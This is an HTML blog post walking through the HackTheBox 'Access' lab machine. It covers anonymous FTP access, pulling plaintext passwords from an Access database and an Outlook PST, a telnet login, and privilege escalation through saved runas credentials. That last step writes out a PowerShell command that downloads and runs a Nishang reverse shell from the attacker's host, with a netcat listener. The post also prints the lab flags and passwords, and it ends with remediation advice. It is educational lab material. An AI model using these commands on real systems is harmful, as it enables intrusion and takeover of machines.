@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Access Machine Walkthrough - Complete Guide - Pixrei</title>
+    
+    <link rel="stylesheet" href="htb-outbound.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="Complete step-by-step walkthrough of HackTheBox Access machine featuring FTP enumeration, database analysis, and Windows privilege escalation">
+    <meta name="keywords" content="HTB, HackTheBox, Access, CTF, Penetration Testing, FTP, MDB Database, Windows, Privilege Escalation, Telnet">
+    
+    <!-- Social Media Meta Tags -->
+    <meta property="og:title" content="HTB Access Machine - Complete Walkthrough">
+    <meta property="og:description" content="Detailed CTF writeup featuring FTP enumeration, database analysis, and Windows privilege escalation techniques">
+    <meta property="og:image" content="../../content/htb-access-preview.jpg">
+    <meta property="og:type" content="article">
+    
+    <!-- Structured Data -->
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Article",
+        "headline": "HTB Access Machine Walkthrough",
+        "author": {
+            "@type": "Person",
+            "name": "R3i 0Trox"
+        },
+        "datePublished": "2025-07-31",
+        "description": "Complete walkthrough of HackTheBox Access machine"
+    }
+    </script>
+</head>
+<body>
+    <!-- Navigation -->
+    <nav id="navbar">
+        <ul>
+            <li><a href="../../index.html"><i class="fas fa-home"></i> Home</a></li>
+            <li><a href="../index.html"><i class="fas fa-blog"></i> All Posts</a></li>
+            <li><a href="../../index.html#boxes"><i class="fas fa-user"></i> About</a></li>
+            <li><a href="../../index.html#last-section"><i class="fas fa-envelope"></i> Contact</a></li>
+        </ul>
+    </nav>
+
+    <!-- Blog Post Content -->
+    <article class="blog-post">
+        <div class="blog-post-container">
+            <!-- Header -->
+            <header class="blog-post-header">
+                <div class="blog-meta">
+                    <span class="blog-category">CTF WRITEUP</span>
+                    <span class="blog-date">July 31, 2025</span>
+                    <span class="read-time">20 min read</span>
+                    <span class="difficulty">🟢 Easy</span>
+                </div>
+                <h1 class="blog-title">HackTheBox - Access Machine</h1>
+                <p class="blog-subtitle">Complete Walkthrough: Physical Security & Saved Credentials</p>
+                <div class="blog-tags">
+                    <span class="tag">#HTB</span>
+                    <span class="tag">#FTP</span>
+                    <span class="tag">#Database</span>
+                    <span class="tag">#Windows</span>
+                    <span class="tag">#PrivEsc</span>
+                    <span class="tag">#Telnet</span>
+                </div>
+            </header>
+
+            <!-- Content -->
+            <div class="blog-content">
+                <!-- Table of Contents -->
+                <div class="toc-box">
+                    <h3>📋 Table of Contents</h3>
+                    <ul class="toc-list">
+                        <li><a href="#machine-info">Machine Information</a></li>
+                        <li><a href="#reconnaissance">Reconnaissance & Enumeration</a></li>
+                        <li><a href="#ftp-enum">FTP Enumeration</a></li>
+                        <li><a href="#database-analysis">Database Analysis</a></li>
+                        <li><a href="#archive-analysis">Archive Analysis</a></li>
+                        <li><a href="#email-analysis">Email Analysis</a></li>
+                        <li><a href="#telnet-access">Telnet Access</a></li>
+                        <li><a href="#user-flag">User Flag</a></li>
+                        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                        <li><a href="#root-flag">Root Flag</a></li>
+                        <li><a href="#lessons-learned">Lessons Learned</a></li>
+                    </ul>
+                </div>
+
+                <section id="machine-info">
+                    <h2>🎯 Machine Information</h2>
+                    <div class="machine-info-grid">
+                        <div class="info-card">
+                            <h4>🖥️ Target Details</h4>
+                            <ul>
+                                <li><strong>Machine Name:</strong> Access</li>
+                                <li><strong>IP Address:</strong> 10.10.10.98</li>
+                                <li><strong>OS:</strong> Windows XP/7</li>
+                                <li><strong>Difficulty:</strong> Easy</li>
+                            </ul>
+                        </div>
+                        <div class="info-card">
+                            <h4>🎲 Machine Theme</h4>
+                            <ul>
+                                <li><strong>Focus:</strong> Physical Security Systems</li>
+                                <li><strong>Key Skills:</strong> FTP Enumeration, Database Analysis</li>
+                                <li><strong>Attack Vector:</strong> Saved Credentials</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>💡 Machine Learning Objectives</h4>
+                        <p>Access is an "easy" difficulty machine that highlights how machines associated with the physical security of an environment may not themselves be secure. It demonstrates how accessible FTP/file shares can often lead to getting a foothold or lateral movement, and teaches techniques for identifying and exploiting saved credentials.</p>
+                    </div>
+                </section>
+
+                <section id="reconnaissance">
+                    <h2>🔍 Reconnaissance & Enumeration</h2>
+                    
+                    <h3>Port Scanning with Nmap</h3>
+                    <p>Let's start with a comprehensive port scan to understand our attack surface:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 Nmap Scan Results</span>
+                        </div>
+                        <pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|*Can't get directory listing: PASV failed: 425 Cannot open data connection.
+23/tcp open  telnet  Microsoft Windows XP telnetd
+| telnet-ntlm-info:
+|   Target_Name: ACCESS
+|   NetBIOS_Domain_Name: ACCESS
+|   NetBIOS_Computer_Name: ACCESS
+|   DNS_Domain_Name: ACCESS
+|   DNS_Computer_Name: ACCESS
+|*  Product_Version: 6.1.7600
+80/tcp open  http    Microsoft IIS httpd 7.5
+|*http-server-header: Microsoft-IIS/7.5
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|*  Potentially risky methods: TRACE
+|_http-title: MegaCorp
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</code></pre>
+                    </div>
+
+                    <div class="analysis-box">
+                        <h4>📊 Port Analysis</h4>
+                        <ul>
+                            <li><strong>Port 21 (FTP):</strong> Microsoft FTP service with anonymous login allowed - Primary attack vector</li>
+                            <li><strong>Port 23 (Telnet):</strong> Windows XP Telnet service - Potential access point once we get credentials</li>
+                            <li><strong>Port 80 (HTTP):</strong> Microsoft IIS 7.5 serving MegaCorp website</li>
+                            <li><strong>Key Finding:</strong> Anonymous FTP access provides our initial entry point</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section id="ftp-enum">
+                    <h2>📁 FTP Enumeration</h2>
+
+                    <h3>Anonymous FTP Access</h3>
+                    <p>The Nmap scan revealed that anonymous FTP login is allowed. This is our primary attack vector:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔐 FTP Anonymous Login</span>
+                        </div>
+                        <pre><code>ftp 10.10.10.98
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name (10.10.10.98:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.</code></pre>
+                    </div>
+
+                    <h3>Directory Exploration</h3>
+                    <p>Let's explore the available directories and files:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📂 FTP Directory Listing</span>
+                        </div>
+                        <pre><code>ftp> ls
+425 Cannot open data connection.
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  09:16PM       <DIR>          Backups
+08-24-18  10:00PM       <DIR>          Engineer
+226 Transfer complete.</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🗂️ Directory Analysis</h4>
+                        <ul>
+                            <li><strong>Backups:</strong> Likely contains backup files - high potential for sensitive data</li>
+                            <li><strong>Engineer:</strong> Engineering files - possibly containing technical documentation or credentials</li>
+                        </ul>
+                    </div>
+
+                    <h3>Backups Directory Investigation</h3>
+                    <p>Let's examine the Backups directory first:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">💾 Backups Directory</span>
+                        </div>
+                        <pre><code>ftp> cd Backups
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  09:16PM              5652480 backup.mdb
+226 Transfer complete.
+ftp> get backup.mdb
+local: backup.mdb remote: backup.mdb
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+5652480 bytes received in 12.45 secs (443.2 kB/s)</code></pre>
+                    </div>
+
+                    <h3>Engineer Directory Investigation</h3>
+                    <p>Now let's check the Engineer directory:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔧 Engineer Directory</span>
+                        </div>
+                        <pre><code>ftp> cd Engineer
+250 CWD command successful.
+ftp> ls
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+08-24-18  01:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp> get Access\ Control.zip
+local: Access Control.zip remote: Access Control.zip
+200 EPRT command successful.
+125 Data connection already open; Transfer starting.
+100% |**************************************************| 10870    25.15 KiB/s    00:00 ETA
+226 Transfer complete.
+10870 bytes received in 0.42 secs (25.15 kB/s)</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>✅ Files Retrieved!</h3>
+                        <ul>
+                            <li><strong>backup.mdb:</strong> 5.6MB Microsoft Access database file</li>
+                            <li><strong>Access Control.zip:</strong> 10.8KB password-protected archive</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section id="database-analysis">
+                    <h2>🗄️ Database Analysis</h2>
+
+                    <h3>MDB File Investigation</h3>
+                    <p>The backup.mdb file is a Microsoft Access database. Let's analyze it using mdb-tools:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔧 Installing MDB Tools</span>
+                        </div>
+                        <pre><code># Install mdb-tools if not already available
+sudo apt install mdb-tools
+
+# List all tables in the database
+mdb-tables backup.mdb</code></pre>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📊 Database Tables Discovery</span>
+                        </div>
+                        <pre><code>acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics</code></pre>
+                    </div>
+
+                    <div class="analysis-box">
+                        <h4>🔍 Key Table Identification</h4>
+                        <p>Among all these tables, the <strong>auth_user</strong> table stands out as it likely contains user authentication information - exactly what we need for credential discovery!</p>
+                    </div>
+
+                    <h3>User Credentials Extraction</h3>
+                    <p>Let's extract data from the auth_user table to find credentials:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔑 Credential Discovery</span>
+                        </div>
+                        <pre><code>mdb-export backup.mdb auth_user</code></pre>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">👥 User Account Data</span>
+                        </div>
+                        <pre><code>id,username,password,Status,last_login,RoleID,Remark
+25,"admin","***",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","**",1,"08/23/18 21:14:02",26,</code></pre>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>🎯 Credentials Discovered!</h4>
+                        <ul>
+                            <li><strong>admin:</strong> ***</li>
+                            <li><strong>engineer:</strong> access4u@security</li>
+                            <li><strong>backup_admin:</strong> ****</li>
+                        </ul>
+                        <p>These credentials will be useful for accessing the password-protected ZIP file!</p>
+                    </div>
+                </section>
+
+                <section id="archive-analysis">
+                    <h2>📦 Archive Analysis</h2>
+
+                    <h3>ZIP File Password Cracking</h3>
+                    <p>Now that we have potential passwords, let's try to extract the Access Control.zip file:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔓 ZIP Extraction Attempts</span>
+                        </div>
+                        <pre><code># Try different passwords from the database
+unzip "Access Control.zip"
+Archive:  Access Control.zip
+[Access Control.zip] Access Control.pst password: access4u@security
+
+# Success! The engineer's password works
+extracting: Access Control.pst</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>✅ Archive Extracted!</h3>
+                        <p>Successfully extracted <strong>Access Control.pst</strong> using password: <code>access4u@security</code></p>
+                    </div>
+
+                    <h3>PST File Analysis</h3>
+                    <p>The extracted file is a Microsoft Outlook PST (Personal Storage Table) file. Let's convert it to readable format:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📧 PST File Conversion</span>
+                        </div>
+                        <pre><code># Install readpst if not available
+sudo apt install pst-utils
+
+# Convert PST to mbox format
+readpst "Access Control.pst"
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+"Access Control" - 2 items done, 0 items skipped.
+
+# List generated files
+ls -la
+-rw-r--r-- 1 kali kali    156 Jul 31 12:30 Access Control.mbox</code></pre>
+                    </div>
+                </section>
+
+                <section id="email-analysis">
+                    <h2>📧 Email Analysis</h2>
+
+                    <h3>Reading Email Contents</h3>
+                    <p>Let's examine the contents of the converted mailbox file:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📨 Email Content</span>
+                        </div>
+                        <pre><code>cat "Access Control.mbox"</code></pre>
+                    </div>
+
+                    <div class="email-content">
+                        <div class="email-header">
+                            <h4>📩 Email Message</h4>
+                        </div>
+                        <div class="config-display">
+                            <pre>
+
+
+From: john@megacorp.com
+To: security@access.htb
+Subject: Credentials Update
+
+----
+The password for the "security" account has been changed to 4Cc3ssC0ntr0ller.
+Please ensure this is passed on to your engineers.
+----</pre>
+                        </div>
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>🔑 Critical Information Found!</h4>
+                        <ul>
+                            <li><strong>Username:</strong> security</li>
+                            <li><strong>Password:</strong> 4Cc3ssC0ntr0ller</li>
+                            <li><strong>Context:</strong> This appears to be credentials for the security account on the Access system</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section id="telnet-access">
+                    <h2>🔌 Telnet Access</h2>
+
+                    <h3>Connecting via Telnet</h3>
+                    <p>Now we can use the discovered credentials to access the Telnet service we identified in our port scan:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔐 Telnet Authentication</span>
+                        </div>
+                        <pre><code>telnet 10.10.10.98  
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: security
+password: 4Cc3ssC0ntr0ller
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security></code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>🎉 Initial Access Achieved!</h3>
+                        <p>Successfully logged in as <strong>security</strong> user via Telnet!</p>
+                    </div>
+                </section>
+
+                <section id="user-flag">
+                    <h2>🚩 User Flag</h2>
+
+                    <h3>Flag Discovery</h3>
+                    <p>Let's navigate to the security user's desktop and retrieve the user flag:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📁 Desktop Exploration</span>
+                        </div>
+                        <pre><code>C:\Users\security>cd Desktop
+C:\Users\security\Desktop>dir
+Volume in drive C has no label.
+Volume Serial Number is 8164-DB5F
+
+Directory of C:\Users\security\Desktop
+
+08/28/2018  07:51 AM    <DIR>          .
+08/28/2018  07:51 AM    <DIR>          ..
+07/29/2025  11:59 AM                34 user.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   3,347,468,288 bytes free</code></pre>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🏆 User Flag</span>
+                        </div>
+                        <pre><code>C:\Users\security\Desktop>type user.txt
+85d48b885cf14ed396b85608b3278068</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>✅ User Flag Captured!</h3>
+                        <p><strong>User Flag:</strong> <code>85d48b885cf14ed396b85608b3278068</code></p>
+                    </div>
+                </section>
+
+                <section id="privilege-escalation">
+                    <h2>⚡ Privilege Escalation</h2>
+
+                    <h3>System Enumeration</h3>
+                    <p>Now we need to escalate privileges to Administrator. Let's explore the system for privilege escalation opportunities:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 System Information</span>
+                        </div>
+                        <pre><code>C:\Users\security>whoami
+access\security
+
+C:\Users\security>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+OS Name:                   Microsoft Windows Server 2008 R2 Standard
+OS Version:                6.1.7600 N/A Build 7600</code></pre>
+                    </div>
+
+                    <h3>Public Desktop Analysis</h3>
+                    <p>Let's check the Public user's desktop for interesting files:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔍 Public Desktop Investigation</span>
+                        </div>
+                        <pre><code>C:\Users\security>cd C:\Users\Public\Desktop
+C:\Users\Public\Desktop>dir
+Volume in drive C has no label.
+Volume Serial Number is 8164-DB5F
+
+Directory of C:\Users\Public\Desktop
+
+08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)   3,347,468,288 bytes free</code></pre>
+                    </div>
+
+                    <h3>Shortcut File Analysis</h3>
+                    <p>The .lnk file is a Windows shortcut. Let's examine its contents to understand what it executes:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🔗 Shortcut Analysis</span>
+                        </div>
+                        <pre><code>C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"</code></pre>
+                    </div>
+
+                    <div class="config-display">
+                        <h4>📄 Raw Shortcut Content</h4>
+                                                <pre>C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
+L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:wWindowsV1MV�System32���:�▒MV��System32▒X2P�:�
+runas.exe���:1��:1�Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
+�wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
+O�j)�H���
+)ΰ[�_���8{E�3
+O�j)�H���
+)ΰ[�       ��1SPS��XF�L8C���&�m�eS-1-5-21-953262931-566350628-63446256-500</pre>
+                    </div>
+
+                    <div class="vulnerability-box">
+                        <h4>🚨 Critical Discovery - Saved Credentials!</h4>
+                        <p>From the shortcut analysis, we can extract a crucial piece of information:</p>
+                        <div class="command-highlight">
+                            <code>runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"</code>
+                        </div>
+                        <p><strong>Key Finding:</strong> The <code>/savecred</code> parameter means Administrator credentials are saved and can be reused!</p>
+                    </div>
+
+                    <h3>Exploitation Setup</h3>
+                    <p>We can exploit the saved credentials to execute commands as Administrator. Let's prepare a reverse shell payload using Nishang:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🛠️ Payload Preparation</span>
+                        </div>
+                        <pre><code># Download Nishang framework
+git clone https://github.com/samratashok/nishang.git
+
+# Create web directory
+mkdir ~/www
+
+# Copy PowerShell reverse shell
+cp nishang/Shells/Invoke-PowerShellTcp.ps1 ~/www/
+
+# Edit the script to add our reverse shell command at the end
+echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 443' >> ~/www/Invoke-PowerShellTcp.ps1</code></pre>
+                    </div>
+
+                    <h3>Web Server Setup</h3>
+                    <p>Start a web server to host our PowerShell payload:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🌐 HTTP Server</span>
+                        </div>
+                        <pre><code># Start Python web server
+cd ~/www
+python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🔒 Network Access Note</h4>
+                        <p>Since we're connected to HTB VPN, any machine on the HTB network can reach our web server at our VPN IP address (10.10.14.10).</p>
+                    </div>
+
+                    <h3>Reverse Shell Listener</h3>
+                    <p>Set up a netcat listener to catch our reverse shell:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">👂 Netcat Listener</span>
+                        </div>
+                        <pre><code># Start netcat listener
+nc -lvnp 443
+
+listening on [any] 443 ...</code></pre>
+                    </div>
+
+                    <h3>Privilege Escalation Execution</h3>
+                    <p>Now we exploit the saved credentials to execute our PowerShell payload as Administrator:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">💥 Privilege Escalation</span>
+                        </div>
+                        <pre><code>C:\Users\Public\Desktop>runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10:80/Invoke-PowerShellTcp.ps1')"</code></pre>
+                    </div>
+
+                    <h3>Administrator Shell Obtained</h3>
+                    <p>Our netcat listener catches the reverse shell with Administrator privileges:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">👑 Administrator Access</span>
+                        </div>
+                        <pre><code>nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.98] 49159
+Windows PowerShell running as user Administrator on ACCESS
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+access\administrator
+
+PS C:\Windows\system32> hostname
+ACCESS</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>🎉 Privilege Escalation Successful!</h3>
+                        <p>We now have a PowerShell session running as <strong>Administrator</strong>!</p>
+                    </div>
+                </section>
+
+                <section id="root-flag">
+                    <h2>🏆 Root Flag</h2>
+
+                    <h3>Administrator Desktop Access</h3>
+                    <p>Let's navigate to the Administrator's desktop and retrieve the root flag:</p>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">📁 Administrator Desktop</span>
+                        </div>
+                        <pre><code>PS C:\Windows\system32> cd C:\Users\Administrator\Desktop
+
+PS C:\Users\Administrator\Desktop> dir
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+-a---        8/21/2018  10:18 PM         32 root.txt</code></pre>
+                    </div>
+
+                    <h3>Final Flag Capture</h3>
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span class="code-title">🎯 Root Flag</span>
+                        </div>
+                        <pre><code>PS C:\Users\Administrator\Desktop> type root.txt
+9d59301ec8f4615078414751950b6820</code></pre>
+                    </div>
+
+                    <div class="success-box">
+                        <h3>🎉 MACHINE PWNED!</h3>
+                        <p><strong>Root Flag:</strong> <code>9d59301ec8f4615078414751950b6820</code></p>
+                        <p>We have successfully compromised the HTB Access machine and obtained both user and root flags!</p>
+                    </div>
+                </section>
+
+                <section id="lessons-learned">
+                    <h2>🎓 Lessons Learned & Key Takeaways</h2>
+
+                    <h3>Attack Chain Summary</h3>
+                    <div class="attack-chain">
+                        <div class="chain-step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Port Scanning</h4>
+                                <p>Identified FTP (21), Telnet (23), and HTTP (80) services</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>FTP Enumeration</h4>
+                                <p>Anonymous FTP access revealed backup files</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Database Analysis</h4>
+                                <p>Extracted credentials from Microsoft Access database</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>Archive Extraction</h4>
+                                <p>Used found credentials to unlock password-protected ZIP</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h4>Email Analysis</h4>
+                                <p>Discovered security account credentials in PST file</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">6</div>
+                            <div class="step-content">
+                                <h4>Telnet Access</h4>
+                                <p>Gained initial foothold using discovered credentials</p>
+                            </div>
+                        </div>
+                        <div class="chain-arrow">↓</div>
+                        <div class="chain-step">
+                            <div class="step-number">7</div>
+                            <div class="step-content">
+                                <h4>Privilege Escalation</h4>
+                                <p>Exploited saved Administrator credentials via runas</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h3>Technical Skills Demonstrated</h3>
+                    <div class="skills-grid">
+                        <div class="skill-card">
+                            <h4>🔍 Enumeration</h4>
+                            <ul>
+                                <li>Port scanning with Nmap</li>
+                                <li>FTP anonymous access</li>
+                                <li>File system exploration</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🗄️ Database Analysis</h4>
+                            <ul>
+                                <li>Microsoft Access MDB files</li>
+                                <li>MDB-tools usage</li>
+                                <li>Credential extraction</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>📧 Email Forensics</h4>
+                            <ul>
+                                <li>PST file analysis</li>
+                                <li>Readpst tool usage</li>
+                                <li>Email content examination</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🔓 Archive Analysis</h4>
+                            <ul>
+                                <li>Password-protected archives</li>
+                                <li>Credential reuse attacks</li>
+                                <li>ZIP file extraction</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>🔌 Legacy Protocols</h4>
+                            <ul>
+                                <li>Telnet authentication</li>
+                                <li>Windows command line</li>
+                                <li>System enumeration</li>
+                            </ul>
+                        </div>
+                        <div class="skill-card">
+                            <h4>⚡ Privilege Escalation</h4>
+                            <ul>
+                                <li>Saved credentials exploitation</li>
+                                <li>PowerShell payloads</li>
+                                <li>Reverse shell techniques</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <h3>Security Lessons</h3>
+                    <div class="lessons-list">
+                        <div class="lesson-item">
+                            <h4>🔐 Anonymous Access</h4>
+                            <p>Anonymous FTP access can lead to significant data exposure. Backup files and sensitive documents should never be accessible without authentication.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>🔑 Credential Storage</h4>
+                            <p>Storing plaintext credentials in databases is extremely dangerous. Passwords should always be properly hashed and salted.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>📧 Email Security</h4>
+                            <p>Sensitive information like passwords should never be transmitted via email. Use secure communication channels and temporary passwords.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>💾 Saved Credentials</h4>
+                                                        <p>The /savecred parameter in runas creates a significant security risk. Saved credentials can be reused by any user on the system to execute commands with elevated privileges.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>🔌 Legacy Services</h4>
+                            <p>Telnet transmits credentials in plaintext and should be replaced with SSH. Legacy services often lack modern security features.</p>
+                        </div>
+                        <div class="lesson-item">
+                            <h4>🛡️ Defense in Depth</h4>
+                            <p>Multiple security failures led to complete compromise. Each layer should be secured independently to prevent cascading failures.</p>
+                        </div>
+                    </div>
+
+                    <h3>Tools and Resources Used</h3>
+                    <div class="tools-box">
+                        <h4>🛠️ Essential Tools</h4>
+                        <ul class="tools-list">
+                            <li><strong>Nmap:</strong> Network reconnaissance and service discovery</li>
+                            <li><strong>FTP Client:</strong> Anonymous file transfer and enumeration</li>
+                            <li><strong>MDB-Tools:</strong> Microsoft Access database analysis</li>
+                            <li><strong>Readpst:</strong> Microsoft Outlook PST file conversion</li>
+                            <li><strong>Unzip:</strong> Archive extraction with password attempts</li>
+                            <li><strong>Telnet:</strong> Remote access to legacy services</li>
+                            <li><strong>Nishang:</strong> PowerShell reverse shell framework</li>
+                            <li><strong>Python HTTP Server:</strong> Payload hosting</li>
+                            <li><strong>Netcat:</strong> Reverse shell listener</li>
+                        </ul>
+                    </div>
+
+                    <h3>Remediation Recommendations</h3>
+                    <div class="remediation-box">
+                        <h4>🛡️ Security Improvements</h4>
+                        <ol>
+                            <li><strong>Disable Anonymous FTP:</strong> Require authentication for all FTP access</li>
+                            <li><strong>Secure Backup Storage:</strong> Store backups in encrypted, access-controlled locations</li>
+                            <li><strong>Hash Passwords:</strong> Never store plaintext credentials in databases</li>
+                            <li><strong>Disable Telnet:</strong> Replace with SSH for secure remote access</li>
+                            <li><strong>Remove Saved Credentials:</strong> Disable /savecred functionality in production</li>
+                            <li><strong>Implement Email Security:</strong> Use encrypted channels for sensitive communications</li>
+                            <li><strong>Regular Security Audits:</strong> Periodically review file permissions and access controls</li>
+                            <li><strong>Network Segmentation:</strong> Isolate critical systems from general network access</li>
